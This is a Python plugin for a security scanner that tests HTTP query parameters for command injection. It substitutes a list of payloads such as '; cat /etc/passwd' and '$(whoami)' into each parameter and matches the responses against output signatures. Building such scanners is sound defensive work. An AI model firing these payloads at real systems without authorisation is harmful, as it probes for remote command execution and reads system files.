import json
import re
from urllib.parse import urlparse, parse_qs, urlencode

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

SERVICE = "http"
DESCRIPTION = "Taken from TFS(https://github.com/PrathyayPGM-ALT/TFS) with permission. Checks for Command Injection vulnerabilities in HTTP query parameters."
SCRIPT_NAME = "http-tfs-cmdi"
OPTIONAL = True

CMDI_PAYLOADS = [
    '; whoami',
    '| whoami',
    '& whoami',
    '`whoami`',
    '$(whoami)',
    '; id',
    '| id',
    '; cat /etc/passwd',
    '| cat /etc/passwd',
    '|| whoami',
    '&& whoami',
    '\nwhoami',
    '; sleep 5',
    '| sleep 5',
    '; ls -la',
    '| dir',
    '; ping -c 1 127.0.0.1',
    '; echo vulnerable',
    '| echo vulnerable',
    '$(echo vulnerable)',
]

CMDI_SIGNS = [
    r'root:.*:0:0:',
    r'uid=\d+\(',
    r'daemon:.*:/usr/sbin',
    r'Volume in drive',
    r'Directory of',
    r'drwxr',
    r'total \d+',
    r'/bin/bash',
    r'Microsoft Windows \[Version',
    r'^vulnerable$',
]


def run(target, port, args=None):
    if not REQUESTS_OK:
        print("[!] requests not installed  ->  pip install requests")
        return

    args = args or {}
    url = args.get("url") or f"http://{target}:{port}"
    output = args.get("output")

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        print("[!] No query parameters found")
        return

    session = requests.Session()
    findings = []

    for param in params:
        for payload in CMDI_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
            try:
                resp = session.get(test_url, allow_redirects=False)
                for sign in CMDI_SIGNS:
                    if re.search(sign, resp.text, re.IGNORECASE | re.MULTILINE):
                        print(f"[!] CMDi param={param} payload={payload[:50]}")
                        print(f"[*] Matched: {sign}")
                        findings.append({
                            "type": "CMDi",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": payload,
                            "evidence": sign,
                            "url": test_url,
                        })
                        break
            except Exception:
                pass

    print(f"[*] Findings: {len(findings)}")

    if output:
        with open(output, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"[+] Saved -> {output}")
